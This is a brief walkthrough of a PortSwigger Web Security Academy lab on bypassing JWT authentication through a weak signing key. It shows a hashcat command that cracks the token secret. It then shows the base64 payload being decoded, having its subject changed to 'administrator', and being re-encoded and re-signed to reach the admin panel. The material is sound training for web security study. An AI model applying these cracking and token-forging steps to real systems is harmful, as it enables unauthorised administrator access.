The steps below are meant to solve the following lab:
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

After taking the session cookie and running the following command, we'll find the secret is "secret1" (For me it was):
hashcat -a 0 -m 16500 <jwt> <wordlist>

JWT Token payload Base 64 encoded:
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4OTcxMzYzMH0

JWT Token payload Base 64 decoded:
{"iss":"portswigger","sub":"wiener","exp":1689713630}

JWT Token payload sub key value changed to administrator:
{"iss":"portswigger","sub":"administrator","exp":1689713630}

JWT Token payload Base 64 encoded:
eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODk3MTM2MzB9

Replacing the old payload with the new payload above and signing the JWT token with "secret1" will give us access to the admin panel.
